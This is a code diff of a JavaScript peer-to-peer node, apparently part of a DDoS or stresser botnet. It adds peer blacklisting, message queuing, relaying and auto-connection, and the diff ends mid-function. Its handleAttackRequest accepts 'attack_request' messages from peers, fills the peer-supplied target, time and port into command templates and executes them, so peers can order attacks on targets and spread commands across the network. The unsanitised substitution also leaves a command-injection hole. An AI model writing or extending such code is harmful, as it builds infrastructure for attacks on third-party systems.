@@ -3,17 +3,13 @@ import { WebSocket, WebSocketServer } from 'ws';
 import crypto from 'crypto';
 
 /**
- * P2P Hybrid System - FIXED VERSION
+ * P2P Hybrid System - HOTFIX VERSION
  * 
  * Fixes:
- * 1. Better WebSocket upgrade handling
- * 2. Race condition prevention with connection locks
- * 3. Proper event listener cleanup
- * 4. Better error handling and fallbacks
- * 5. Optimized heartbeat (removed duplicate ping)
- * 6. Self-connection prevention with IP check
- * 7. Connection timeout handling
- * 8. Better peer state management
+ * 1. Port type conversion (string -> number)
+ * 2. Reachability checking for null peers
+ * 3. Auto-connect to all DIRECT mode peers (not just reachable)
+ * 4. Better peer filtering
  */
 
 class P2PHybridNode extends EventEmitter {
@@ -28,15 +24,20 @@ class P2PHybridNode extends EventEmitter {
     this.nodePort = config.SERVER.PORT;
     
     // Peer connections
-    this.peers = new Map(); // nodeId -> { ws, info, lastSeen, direct }
-    this.pendingConnections = new Map(); // nodeId -> timeout
-    this.connectionLocks = new Set(); // nodeId set untuk prevent race conditions
+    this.peers = new Map();
+    this.pendingConnections = new Map();
+    this.connectionLocks = new Set();
     
     // Discovery
-    this.knownPeers = new Map(); // nodeId -> { ip, port, capabilities, lastUpdate }
+    this.knownPeers = new Map();
+    this.peerBlacklist = new Map();
     
-    // WebSocket server untuk menerima P2P connections
+    // Message queue
+    this.messageQueue = new Map();
+    
+    // WebSocket server
     this.wss = null;
+    this.isServerReady = false;
     
     // Stats
     this.stats = {
@@ -44,9 +45,14 @@ class P2PHybridNode extends EventEmitter {
       relayedConnections: 0,
       messagesReceived: 0,
       messagesSent: 0,
+      messagesQueued: 0,
+      messagesRelayed: 0,
       peersDiscovered: 0,
       connectionAttempts: 0,
-      connectionFailures: 0
+      connectionFailures: 0,
+      connectionSuccesses: 0,
+      lastDiscovery: null,
+      lastAutoConnect: null
     };
     
     // Configuration
@@ -58,7 +64,13 @@ class P2PHybridNode extends EventEmitter {
       autoConnect: config.P2P?.AUTO_CONNECT !== false,
       relayFallback: config.P2P?.RELAY_FALLBACK !== false,
       heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000,
-      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000
+      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000,
+      maxConnectionAttempts: 3,
+      connectionBackoffMs: 5000,
+      blacklistDuration: 300000,
+      messageQueueSize: 100,
+      autoConnectDelay: 10000,
+      cleanupInterval: 60000
     };
     
     // Encryption
@@ -68,30 +80,30 @@ class P2PHybridNode extends EventEmitter {
     this.discoveryInterval = null;
     this.peerCleanupInterval = null;
     this.heartbeatInterval = null;
+    this.autoConnectInterval = null;
     
     // Shutdown flag
     this.isShuttingDown = false;
     
-    // Request handlers map for cleanup
+    // Request handlers
     this.requestHandlers = new Map();
+    
+    // Master connection
+    this.masterReachable = false;
+    this.lastMasterCheck = null;
     
     console.log('[P2P] P2P Hybrid Node initialized', {
       nodeId: this.nodeId,
-      enabled: this.p2pConfig.enabled
+      enabled: this.p2pConfig.enabled,
+      maxPeers: this.p2pConfig.maxPeers
     });
   }
   
-  /**
-   * Set encryption manager
-   */
   setEncryptionManager(manager) {
     this.encryptionManager = manager;
     console.log('[P2P] Encryption manager set');
   }
   
-  /**
-   * FIX: Better WebSocket upgrade handling
-   */
   async startP2PServer(fastifyServer) {
     if (!this.p2pConfig.enabled) {
       console.log('[P2P] P2P is disabled');
@@ -99,28 +111,22 @@ class P2PHybridNode extends EventEmitter {
     }
     
     try {
-      // Create WebSocket server
       this.wss = new WebSocketServer({ 
         noServer: true,
-        clientTracking: true
+        clientTracking: true,
+        perMessageDeflate: false
       });
       
-      // FIX: Better upgrade handler with error handling
       fastifyServer.server.on('upgrade', (request, socket, head) => {
         try {
-          const pathname = new URL(request.url, `ws://${request.headers.host}`).pathname;
+          const url = new URL(request.url, `http://${request.headers.host}`);
+          const pathname = url.pathname;
           
           if (pathname === '/p2p') {
-            console.log('[P2P-SERVER] Incoming P2P connection request');
-            
+            console.log('[P2P-SERVER] Handling P2P WebSocket upgrade');
             this.wss.handleUpgrade(request, socket, head, (ws) => {
               this.wss.emit('connection', ws, request);
             });
-          } else {
-            // FIX: Properly handle non-P2P upgrade requests
-            // Don't touch the socket, let other handlers deal with it
-            // If no other handler, Fastify will handle it or close it
-            console.log(`[P2P-SERVER] Ignoring non-P2P upgrade request: ${pathname}`);
           }
         } catch (error) {
           console.error('[P2P-SERVER] Upgrade error:', error.message);
@@ -128,53 +134,78 @@ class P2PHybridNode extends EventEmitter {
         }
       });
       
-      // Handle new P2P connections
       this.wss.on('connection', (ws, request) => {
         this.handleIncomingPeerConnection(ws, request);
       });
       
-      // FIX: Add error handler for WSS
       this.wss.on('error', (error) => {
         console.error('[P2P-SERVER] WebSocket server error:', error.message);
       });
       
+      this.isServerReady = true;
       console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort}`);
       
-      // Start background tasks
-      this.startPeerDiscovery();
-      this.startPeerCleanup();
-      this.startPeerHeartbeat();
+      await this.checkMasterConnectivity();
+      
+      setTimeout(() => this.startPeerDiscovery(), 2000);
+      setTimeout(() => this.startPeerCleanup(), 5000);
+      setTimeout(() => this.startPeerHeartbeat(), 3000);
+      setTimeout(() => this.startAutoConnector(), 15000);
+      
+      console.log('[P2P-SERVER] Background tasks scheduled');
       
       return true;
       
     } catch (error) {
       console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
-      // FIX: Cleanup on failure
-      if (this.wss) {
-        try {
-          this.wss.close();
-        } catch (e) {
-          // ignore
-        }
-        this.wss = null;
-      }
+      this.cleanup();
       return false;
     }
   }
   
-  /**
-   * FIX: Better incoming connection handling with validation
-   */
+  async checkMasterConnectivity() {
+    if (!this.config.MASTER?.URL) {
+      console.log('[P2P] No master URL configured');
+      this.masterReachable = false;
+      return false;
+    }
+    
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      
+      const response = await globalThis.fetch(
+        `${this.config.MASTER.URL}/api/status`,
+        { signal: controller.signal }
+      );
+      
+      clearTimeout(timeout);
+      
+      this.masterReachable = response.ok;
+      this.lastMasterCheck = Date.now();
+      
+      console.log(`[P2P] Master is ${this.masterReachable ? 'reachable' : 'unreachable'}`);
+      
+      return this.masterReachable;
+      
+    } catch (error) {
+      console.log('[P2P] Master check failed:', error.message);
+      this.masterReachable = false;
+      this.lastMasterCheck = Date.now();
+      return false;
+    }
+  }
+  
   handleIncomingPeerConnection(ws, request) {
     const remoteNodeId = request.headers['x-node-id'];
-    const remoteIp = request.headers['x-forwarded-for'] || request.socket.remoteAddress;
+    const remoteIp = request.headers['x-forwarded-for'] || 
+                     request.socket.remoteAddress?.replace('::ffff:', '');
     
-    console.log('[P2P-SERVER] New peer connection:', {
+    console.log('[P2P-SERVER] New peer connection attempt:', {
       remoteNodeId,
       remoteIp
     });
     
-    // Validation
     if (!remoteNodeId) {
       console.log('[P2P-SERVER] Rejected: Missing node ID');
       ws.close(4000, 'Missing node ID');
@@ -187,74 +218,72 @@ class P2PHybridNode extends EventEmitter {
       return;
     }
     
-    // FIX: Check if we're at max peers
+    if (this.isBlacklisted(remoteNodeId)) {
+      console.log('[P2P-SERVER] Rejected: Blacklisted');
+      ws.close(4002, 'Blacklisted');
+      return;
+    }
+    
     if (this.peers.size >= this.p2pConfig.maxPeers) {
       console.log('[P2P-SERVER] Rejected: Max peers reached');
       ws.close(4003, 'Max peers reached');
       return;
     }
     
-    // FIX: If we already have this peer, close the OLD connection
-    // (not the new one) to prevent race conditions
     if (this.peers.has(remoteNodeId)) {
-      console.log('[P2P-SERVER] Peer already connected, closing old connection');
+      console.log('[P2P-SERVER] Peer already connected, replacing old connection');
       const oldPeer = this.peers.get(remoteNodeId);
       try {
         oldPeer.ws.close();
-      } catch (e) {
-        // ignore
-      }
+      } catch (e) {}
       this.peers.delete(remoteNodeId);
     }
     
-    // Store peer connection
     const peerInfo = {
       ws,
       nodeId: remoteNodeId,
       ip: remoteIp,
+      port: null,
       connected: true,
       direct: true,
       lastSeen: Date.now(),
       lastHeartbeat: Date.now(),
       messagesReceived: 0,
       messagesSent: 0,
-      connectedAt: Date.now()
+      connectedAt: Date.now(),
+      capabilities: null
     };
     
     this.peers.set(remoteNodeId, peerInfo);
+    this.connectionLocks.delete(remoteNodeId);
     this.stats.directConnections++;
+    this.stats.connectionSuccesses++;
     
-    // Send welcome message
     this.sendToPeer(remoteNodeId, {
       type: 'welcome',
       nodeId: this.nodeId,
+      ip: this.nodeIp,
+      port: this.nodePort,
       timestamp: Date.now(),
       capabilities: {
         encryption: !!this.encryptionManager,
         methods: Object.keys(this.methodsConfig),
-        version: '1.0'
+        relay: this.p2pConfig.relayFallback && this.masterReachable,
+        version: '2.0'
       }
     });
     
-    // Setup event handlers
     ws.on('message', (data) => {
       this.handlePeerMessage(remoteNodeId, data);
     });
     
     ws.on('close', (code, reason) => {
       console.log(`[P2P] Peer ${remoteNodeId} disconnected (code: ${code})`);
-      this.peers.delete(remoteNodeId);
-      this.connectionLocks.delete(remoteNodeId); // FIX: Release lock
-      this.emit('peer_disconnected', { 
-        nodeId: remoteNodeId, 
-        code,
-        reason: reason?.toString() || 'Unknown'
-      });
+      this.handlePeerDisconnected(remoteNodeId, code, reason);
     });
     
     ws.on('error', (error) => {
       console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
-      // FIX: Don't delete peer on error, wait for close event
     });
     
     ws.on('pong', () => {
@@ -269,54 +298,100 @@ class P2PHybridNode extends EventEmitter {
       direct: true
     });
     
-    console.log(`[P2P] Peer ${remoteNodeId} connected (direct)`);
+    this.processQueuedMessages(remoteNodeId);
+    
+    console.log(`[P2P] Peer ${remoteNodeId} connected successfully (direct)`);
   }
   
-  /**
-   * FIX: Race condition prevention with locks
-   */
-  async connectToPeer(nodeId, peerInfo) {
+  handlePeerDisconnected(nodeId, code, reason) {
+    this.peers.delete(nodeId);
+    this.connectionLocks.delete(nodeId);
+    
+    this.emit('peer_disconnected', { 
+      nodeId,
+      code,
+      reason: reason?.toString() || 'Unknown'
+    });
+  }
+  
+  isBlacklisted(nodeId) {
+    if (!this.peerBlacklist.has(nodeId)) {
+      return false;
+    }
+    
+    const entry = this.peerBlacklist.get(nodeId);
+    if (Date.now() > entry.until) {
+      this.peerBlacklist.delete(nodeId);
+      return false;
+    }
+    
+    return true;
+  }
+  
+  blacklistPeer(nodeId, reason, duration = null) {
+    const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
+    this.peerBlacklist.set(nodeId, { reason, until });
+    console.log(`[P2P] Blacklisted peer ${nodeId} for ${Math.round((until - Date.now())/1000)}s: ${reason}`);
+  }
+  
+  // FIX: Normalize port to number
+  normalizePort(port) {
+    if (typeof port === 'string') {
+      return parseInt(port, 10);
+    }
+    return port;
+  }
+  
+  async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
     if (nodeId === this.nodeId) {
       return { success: false, error: 'Cannot connect to self' };
     }
     
-    // FIX: Check if it's our own IP:port
-    if (peerInfo.ip === this.nodeIp && peerInfo.port === this.nodePort) {
+    // FIX: Normalize port
+    const normalizedPort = this.normalizePort(peerInfo.port);
+    
+    if (peerInfo.ip === this.nodeIp && normalizedPort === this.nodePort) {
       return { success: false, error: 'Cannot connect to self (same IP:port)' };
     }
     
-    // FIX: Check if already connected
     if (this.peers.has(nodeId)) {
       return { success: true, existing: true };
     }
     
-    // FIX: Check if connection is in progress (prevent race condition)
+    if (this.isBlacklisted(nodeId)) {
+      return { success: false, error: 'Peer is blacklisted' };
+    }
+    
     if (this.connectionLocks.has(nodeId)) {
       return { success: false, error: 'Connection already in progress' };
     }
     
-    // FIX: Check max peers
     if (this.peers.size >= this.p2pConfig.maxPeers) {
       return { success: false, error: 'Max peers reached' };
     }
     
-    if (!peerInfo.ip || !peerInfo.port) {
+    if (retryAttempt >= this.p2pConfig.maxConnectionAttempts) {
+      this.blacklistPeer(nodeId, `Max connection attempts (${retryAttempt}) reached`);
+      return { success: false, error: 'Max attempts reached' };
+    }
+    
+    if (!peerInfo.ip || !normalizedPort) {
       return { success: false, error: 'Missing peer IP or port' };
     }
     
-    // FIX: Acquire connection lock
     this.connectionLocks.add(nodeId);
     this.stats.connectionAttempts++;
     
     try {
-      const wsUrl = `ws://${peerInfo.ip}:${peerInfo.port}/p2p`;
+      const wsUrl = `ws://${peerInfo.ip}:${normalizedPort}/p2p`;
       
-      console.log(`[P2P] Connecting to peer ${nodeId} at ${wsUrl}`);
+      console.log(`[P2P] Connecting to peer ${nodeId} at ${wsUrl} (attempt ${retryAttempt + 1}/${this.p2pConfig.maxConnectionAttempts})`);
       
       const ws = new WebSocket(wsUrl, {
         headers: {
           'X-Node-ID': this.nodeId,
-          'X-Node-IP': this.nodeIp || 'unknown'
+          'X-Node-IP': this.nodeIp || 'unknown',
+          'X-Node-Port': this.nodePort.toString()
         },
         handshakeTimeout: this.p2pConfig.connectionTimeout
       });
@@ -324,46 +399,50 @@ class P2PHybridNode extends EventEmitter {
       return new Promise((resolve) => {
         const timeout = setTimeout(() => {
           ws.close();
-          this.connectionLocks.delete(nodeId); // FIX: Release lock
+          this.connectionLocks.delete(nodeId);
           this.stats.connectionFailures++;
+          
+          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
+            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
+            console.log(`[P2P] Connection timeout, retrying in ${backoff}ms...`);
+            setTimeout(() => {
+              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
+            }, backoff);
+          }
+          
           resolve({ success: false, error: 'Connection timeout' });
         }, this.p2pConfig.connectionTimeout);
         
         ws.on('open', () => {
           clearTimeout(timeout);
           
-          // Store peer
           const peer = {
             ws,
             nodeId,
             ip: peerInfo.ip,
-            port: peerInfo.port,
+            port: normalizedPort,
             connected: true,
             direct: true,
             lastSeen: Date.now(),
             lastHeartbeat: Date.now(),
             messagesReceived: 0,
             messagesSent: 0,
-            connectedAt: Date.now()
+            connectedAt: Date.now(),
+            capabilities: peerInfo.capabilities || null
           };
           
           this.peers.set(nodeId, peer);
+          this.connectionLocks.delete(nodeId);
           this.stats.directConnections++;
+          this.stats.connectionSuccesses++;
           
-          // Setup handlers
           ws.on('message', (data) => {
             this.handlePeerMessage(nodeId, data);
           });
           
           ws.on('close', (code, reason) => {
             console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
-            this.peers.delete(nodeId);
-            this.connectionLocks.delete(nodeId); // FIX: Release lock
-            this.emit('peer_disconnected', { 
-              nodeId,
-              code,
-              reason: reason?.toString() || 'Unknown'
-            });
+            this.handlePeerDisconnected(nodeId, code, reason);
           });
           
           ws.on('error', (error) => {
@@ -379,56 +458,60 @@ class P2PHybridNode extends EventEmitter {
           this.emit('peer_connected', {
             nodeId,
             ip: peerInfo.ip,
-            port: peerInfo.port,
+            port: normalizedPort,
             direct: true
           });
           
-          console.log(`[P2P] Connected to peer ${nodeId} (direct)`);
+          this.processQueuedMessages(nodeId);
+          
+          console.log(`[P2P] Connected to peer ${nodeId} successfully (direct)`);
           resolve({ success: true, direct: true });
         });
         
         ws.on('error', (error) => {
           clearTimeout(timeout);
-          this.connectionLocks.delete(nodeId); // FIX: Release lock
+          this.connectionLocks.delete(nodeId);
           this.stats.connectionFailures++;
-          console.log(`[P2P] Failed to connect to ${nodeId}:`, error.message);
+          
+          console.log(`[P2P] Failed to connect to ${nodeId}: ${error.message}`);
+          
+          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
+            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
+            console.log(`[P2P] Retrying connection in ${backoff}ms...`);
+            setTimeout(() => {
+              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
+            }, backoff);
+          }
+          
           resolve({ success: false, error: error.message });
         });
       });
       
     } catch (error) {
-      this.connectionLocks.delete(nodeId); // FIX: Release lock on error
+      this.connectionLocks.delete(nodeId);
       this.stats.connectionFailures++;
       console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
       return { success: false, error: error.message };
     }
   }
   
-  /**
-   * Handle message from peer
-   */
   handlePeerMessage(nodeId, data) {
     try {
       const message = JSON.parse(data.toString());
       
-      // Update last seen
       if (this.peers.has(nodeId)) {
-        this.peers.get(nodeId).lastSeen = Date.now();
-        this.peers.get(nodeId).messagesReceived++;
+        const peer = this.peers.get(nodeId);
+        peer.lastSeen = Date.now();
+        peer.messagesReceived++;
       }
       
       this.stats.messagesReceived++;
       
-      console.log(`[P2P] Message from ${nodeId}:`, message.type);
+      console.log(`[P2P] Message from ${nodeId}: ${message.type}`);
       
-      // Handle different message types
       switch (message.type) {
         case 'welcome':
-          console.log(`[P2P] Received welcome from ${nodeId}`);
-          this.emit('peer_info', {
-            nodeId,
-            capabilities: message.capabilities
-          });
+          this.handleWelcomeMessage(nodeId, message);
           break;
           
         case 'ping':
@@ -467,6 +550,14 @@ class P2PHybridNode extends EventEmitter {
           this.handlePeerListUpdate(message);
           break;
           
+        case 'relay_request':
+          this.handleRelayRequest(nodeId, message);
+          break;
+          
+        case 'relay_response':
+          this.handleRelayResponse(nodeId, message);
+          break;
+          
         default:
           console.log(`[P2P] Unknown message type: ${message.type}`);
           this.emit('peer_message', {
@@ -480,9 +571,34 @@ class P2PHybridNode extends EventEmitter {
     }
   }
   
-  /**
-   * Handle attack request from peer
-   */
+  handleWelcomeMessage(nodeId, message) {
+    console.log(`[P2P] Received welcome from ${nodeId}`);
+    
+    if (this.peers.has(nodeId)) {
+      const peer = this.peers.get(nodeId);
+      peer.capabilities = message.capabilities;
+      
+      // FIX: Normalize port
+      if (message.ip) peer.ip = message.ip;
+      if (message.port) peer.port = this.normalizePort(message.port);
+      
+      this.knownPeers.set(nodeId, {
+        nodeId,
+        ip: message.ip || peer.ip,
+        port: this.normalizePort(message.port || peer.port),
+        mode: 'DIRECT',
+        reachable: true,
+        capabilities: message.capabilities,
+        lastUpdate: Date.now()
+      });
+    }
+    
+    this.emit('peer_info', {
+      nodeId,
+      capabilities: message.capabilities
+    });
+  }
+  
   async handleAttackRequest(nodeId, message) {
     const { requestId, target, time, port, methods } = message;
     
@@ -493,7 +609,6 @@ class P2PHybridNode extends EventEmitter {
     });
     
     try {
-      // Validate method
       if (!this.methodsConfig[methods]) {
         this.sendToPeer(nodeId, {
           type: 'attack_response',
@@ -504,19 +619,16 @@ class P2PHybridNode extends EventEmitter {
         return;
       }
       
-      // Build command
       const methodCfg = this.methodsConfig[methods];
       const command = methodCfg.cmd
         .replaceAll('{target}', target)
         .replaceAll('{time}', time)
         .replaceAll('{port}', port);
       
-      // Execute
       const result = await this.executor.execute(command, {
         expectedDuration: time
       });
       
-      // Send response
       this.sendToPeer(nodeId, {
         type: 'attack_response',
         requestId,
@@ -529,6 +641,8 @@ class P2PHybridNode extends EventEmitter {
         methods
       });
       
+      console.log(`[P2P] Attack executed for ${nodeId}`);
+      
     } catch (error) {
       this.sendToPeer(nodeId, {
         type: 'attack_response',
@@ -539,9 +653,6 @@ class P2PHybridNode extends EventEmitter {
     }
   }
   
-  /**
-   * Handle status request from peer
-   */
   async handleStatusRequest(nodeId, message) {
     const { requestId } = message;
     
@@ -572,9 +683,48 @@ class P2PHybridNode extends EventEmitter {
     }
   }
   
-  /**
-   * Handle peer list update from discovery
-   */
+  async handleRelayRequest(nodeId, message) {
+    const { relayId, targetNodeId, payload } = message;
+    
+    console.log(`[P2P-RELAY] Relay request from ${nodeId} to ${targetNodeId}`);
+    
+    if (this.peers.has(targetNodeId)) {
+      const success = this.sendToPeer(targetNodeId, {
+        type: 'relayed_message',
+        sourceNodeId: nodeId,
+        relayId,
+        payload
+      });
+      
+      this.sendToPeer(nodeId, {
+        type: 'relay_response',
+        relayId,
+        success,
+        targetNodeId
+      });
+      
+      if (success) {
+        this.stats.messagesRelayed++;
+      }
+      
+    } else {
+      this.sendToPeer(nodeId, {
+        type: 'relay_response',
+        relayId,
+        success: false,
+        error: 'Target not connected',
+        targetNodeId
+      });
+    }
+  }
+  
+  handleRelayResponse(nodeId, message) {
+    this.emit('relay_response', {
+      relayNodeId: nodeId,
+      ...message
+    });
+  }
+  
   handlePeerListUpdate(message) {
     const { peers } = message;
     
@@ -582,17 +732,20 @@ class P2PHybridNode extends EventEmitter {
       return;
     }
     
-    console.log(`[P2P] Received peer list: ${peers.length} peers`);
+    console.log(`[P2P-DISCOVERY] Received peer list: ${peers.length} peers`);
     
     let newPeers = 0;
+    let updatedPeers = 0;
     
     for (const peer of peers) {
       if (!peer.node_id || peer.node_id === this.nodeId) {
         continue;
       }
       
-      // FIX: Don't add ourselves
-      if (peer.ip === this.nodeIp && peer.port === this.nodePort) {
+      // FIX: Normalize port
+      const normalizedPort = this.normalizePort(peer.port);
+      
+      if (peer.ip === this.nodeIp && normalizedPort === this.nodePort) {
         continue;
       }
       
@@ -601,39 +754,31 @@ class P2PHybridNode extends EventEmitter {
       if (!existing) {
         newPeers++;
         this.stats.peersDiscovered++;
+      } else {
+        updatedPeers++;
       }
       
       this.knownPeers.set(peer.node_id, {
         nodeId: peer.node_id,
         ip: peer.ip,
-        port: peer.port,
+        port: normalizedPort,
         mode: peer.mode,
-        reachable: peer.reachable,
+        reachable: peer.reachable !== false, // FIX: Default to true if null
         methods: peer.methods_supported || [],
         lastUpdate: Date.now()
       });
     }
     
-    if (newPeers > 0) {
-      console.log(`[P2P] Discovered ${newPeers} new peers`);
-      
-      // Auto-connect to new reachable peers
-      if (this.p2pConfig.autoConnect) {
-        // FIX: Use setTimeout to prevent blocking
-        setTimeout(() => this.autoConnectToPeers(), 1000);
-      }
+    if (newPeers > 0 || updatedPeers > 0) {
+      console.log(`[P2P-DISCOVERY] Updated: ${newPeers} new, ${updatedPeers} existing peers`);
     }
   }
   
-  /**
-   * Send message to peer
-   */
   sendToPeer(nodeId, message) {
     const peer = this.peers.get(nodeId);
     
     if (!peer || !peer.connected) {
-      console.log(`[P2P] Peer ${nodeId} not connected, cannot send message`);
-      return false;
+      return this.queueMessage(nodeId, message);
     }
     
     try {
@@ -643,18 +788,67 @@ class P2PHybridNode extends EventEmitter {
         this.stats.messagesSent++;
         return true;
       } else {
-        console.log(`[P2P] Peer ${nodeId} WebSocket not open (state: ${peer.ws.readyState})`);
-        return false;
+        console.log(`[P2P] Peer ${nodeId} WebSocket not open, queuing message`);
+        return this.queueMessage(nodeId, message);
       }
     } catch (error) {
       console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
-      return false;
+      return this.queueMessage(nodeId, message);
     }
   }
   
-  /**
-   * Broadcast message to all peers
-   */
+  queueMessage(nodeId, message) {
+    if (!this.messageQueue.has(nodeId)) {
+      this.messageQueue.set(nodeId, []);
+    }
+    
+    const queue = this.messageQueue.get(nodeId);
+    
+    if (queue.length >= this.p2pConfig.messageQueueSize) {
+      queue.shift();
+    }
+    
+    queue.push({
+      message,
+      timestamp: Date.now()
+    });
+    
+    this.stats.messagesQueued++;
+    
+    console.log(`[P2P] Queued message for ${nodeId} (queue size: ${queue.length})`);
+    
+    return false;
+  }
+  
+  processQueuedMessages(nodeId) {
+    if (!this.messageQueue.has(nodeId)) {
+      return;
+    }
+    
+    const queue = this.messageQueue.get(nodeId);
+    
+    if (queue.length === 0) {
+      return;
+    }
+    
+    console.log(`[P2P] Processing ${queue.length} queued messages for ${nodeId}`);
+    
+    let sent = 0;
+    let failed = 0;
+    
+    for (const item of queue) {
+      if (this.sendToPeer(nodeId, item.message)) {
+        sent++;
+      } else {
+        failed++;
+      }
+    }
+    
+    this.messageQueue.delete(nodeId);
+    
+    console.log(`[P2P] Processed queue for ${nodeId}: ${sent} sent, ${failed} failed`);
+  }
+  
   broadcastToPeers(message, excludeNodeId = null) {
     let sent = 0;
     
@@ -671,9 +865,6 @@ class P2PHybridNode extends EventEmitter {
     return sent;
   }
   
-  /**
-   * FIX: Proper event listener cleanup for request/response pattern
-   */
   async requestAttackFromPeer(nodeId, target, time, port, methods) {
     const requestId = crypto.randomBytes(8).toString('hex');
     
@@ -695,21 +886,20 @@ class P2PHybridNode extends EventEmitter {
       
       const handler = (data) => {
         if (data.requestId === requestId) {
-          cleanup(); // FIX: Proper cleanup
+          cleanup();
           resolve(data);
         }
       };
       
-      // Store handler for cleanup
       this.requestHandlers.set(handlerKey, handler);
       this.on('attack_response', handler);
       
       timeoutId = setTimeout(() => {
-        cleanup(); // FIX: Cleanup on timeout
+        cleanup();
         resolve({ success: false, error: 'Timeout' });
       }, 30000);
       
-      this.sendToPeer(nodeId, {
+      const sent = this.sendToPeer(nodeId, {
         type: 'attack_request',
         requestId,
         target,
@@ -717,12 +907,14 @@ class P2PHybridNode extends EventEmitter {
         port,
         methods
       });
+      
+      if (!sent) {
+        cleanup();
+        resolve({ success: false, error: 'Failed to send request' });
+      }
     });
   }
   
-  /**
-   * FIX: Proper event listener cleanup for status request
-   */
   async requestStatusFromPeer(nodeId) {
     const requestId = crypto.randomBytes(8).toString('hex');
     
@@ -731,10 +923,7 @@ class P2PHybridNode extends EventEmitter {
       let handlerKey = `status_response_${requestId}`;
       
       const cleanup = () => {
-        if (timeoutId) {
-          clearTimeout(timeoutId);
-          timeoutId = null;
-        }
+        if (timeoutId) clearTimeout(timeoutId);
         if (this.requestHandlers.has(handlerKey)) {
           const handler = this.requestHandlers.get(handlerKey);
           this.removeListener('status_response', handler);
@@ -744,30 +933,81 @@ class P2PHybridNode extends EventEmitter {
       
       const handler = (data) => {
         if (data.requestId === requestId) {
-          cleanup(); // FIX: Proper cleanup
+          cleanup();
           resolve(data);
         }
       };
       
-      // Store handler for cleanup
       this.requestHandlers.set(handlerKey, handler);
       this.on('status_response', handler);
       
       timeoutId = setTimeout(() => {
-        cleanup(); // FIX: Cleanup on timeout
+        cleanup();
         resolve({ success: false, error: 'Timeout' });
       }, 10000);
       
-      this.sendToPeer(nodeId, {
+      const sent = this.sendToPeer(nodeId, {
         type: 'status_request',
         requestId
       });
+      
+      if (!sent) {
+        cleanup();
+        resolve({ success: false, error: 'Failed to send request' });
+      }
     });
   }
   
-  /**
-   * Start peer discovery from master
-   */
+  async relayMessage(targetNodeId, message) {
+    if (!this.p2pConfig.relayFallback) {
+      return { success: false, error: 'Relay disabled' };
+    }
+    
+    for (const [nodeId, peer] of this.peers) {
+      if (nodeId === targetNodeId) continue;
+      
+      const relayId = crypto.randomBytes(8).toString('hex');
+      
+      return new Promise((resolve) => {
+        let timeoutId = null;
+        let handlerKey = `relay_response_${relayId}`;
+        
+        const cleanup = () => {
+          if (timeoutId) clearTimeout(timeoutId);
+          if (this.requestHandlers.has(handlerKey)) {
+            const handler = this.requestHandlers.get(handlerKey);
+            this.removeListener('relay_response', handler);
+            this.requestHandlers.delete(handlerKey);
+          }
+        };
+        
+        const handler = (data) => {
+          if (data.relayId === relayId) {
+            cleanup();
+            resolve(data);
+          }
+        };
+        
+        this.requestHandlers.set(handlerKey, handler);
+        this.on('relay_response', handler);
+        
+        timeoutId = setTimeout(() => {
+          cleanup();
+          resolve({ success: false, error: 'Relay timeout' });
+        }, 15000);
+        
+        this.sendToPeer(nodeId, {
+          type: 'relay_request',
+          relayId,
+          targetNodeId,
+          payload: message
+        });
+      });
+    }
+    
+    return { success: false, error: 'No relay peer available' };
+  }
+  
   startPeerDiscovery() {
     if (this.discoveryInterval) {
       clearInterval(this.discoveryInterval);
@@ -775,10 +1015,8 @@ class P2PHybridNode extends EventEmitter {
     
     console.log(`[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`);
     
-    // Initial discovery
     setTimeout(() => this.discoverPeers(), 5000);
     
-    // Periodic discovery
     this.discoveryInterval = setInterval(() => {
       if (!this.isShuttingDown) {
         this.discoverPeers();
@@ -786,11 +1024,9 @@ class P2PHybridNode extends EventEmitter {
     }, this.p2pConfig.discoveryInterval);
   }
   
-  /**
-   * Discover peers from master
-   */
   async discoverPeers() {
     if (!this.config.MASTER?.URL) {
+      console.log('[P2P-DISCOVERY] No master URL configured');
       return;
     }
     
@@ -808,10 +1044,13 @@ class P2PHybridNode extends EventEmitter {
       
       if (!response.ok) {
         console.log('[P2P-DISCOVERY] Failed to get peer list:', response.status);
+        this.masterReachable = false;
         return;
       }
       
       const data = await response.json();
+      this.masterReachable = true;
+      this.stats.lastDiscovery = Date.now();
       
       if (data.nodes && Array.isArray(data.nodes)) {
         this.handlePeerListUpdate({ peers: data.nodes });
@@ -819,65 +1058,92 @@ class P2PHybridNode extends EventEmitter {
       
     } catch (error) {
       console.error('[P2P-DISCOVERY] Error:', error.message);
+      this.masterReachable = false;
     }
   }
   
-  /**
-   * FIX: Rate-limited auto-connect with better error handling
-   */
+  startAutoConnector() {
+    if (!this.p2pConfig.autoConnect) {
+      console.log('[P2P-AUTO] Auto-connect disabled');
+      return;
+    }
+    
+    if (this.autoConnectInterval) {
+      clearInterval(this.autoConnectInterval);
+    }
+    
+    console.log(`[P2P-AUTO] Starting auto-connector every ${this.p2pConfig.autoConnectDelay}ms`);
+    
+    setTimeout(() => this.autoConnectToPeers(), this.p2pConfig.autoConnectDelay);
+    
+    this.autoConnectInterval = setInterval(() => {
+      if (!this.isShuttingDown) {
+        this.autoConnectToPeers();
+      }
+    }, this.p2pConfig.autoConnectDelay);
+  }
+  
+  // FIX: Connect to ALL DIRECT mode peers, not just reachable:true
   async autoConnectToPeers() {
     if (this.isShuttingDown) {
       return;
     }
     
     if (this.peers.size >= this.p2pConfig.maxPeers) {
-      console.log('[P2P] Max peers reached, skipping auto-connect');
+      console.log('[P2P-AUTO] Max peers reached, skipping auto-connect');
       return;
     }
     
-    const reachablePeers = Array.from(this.knownPeers.values())
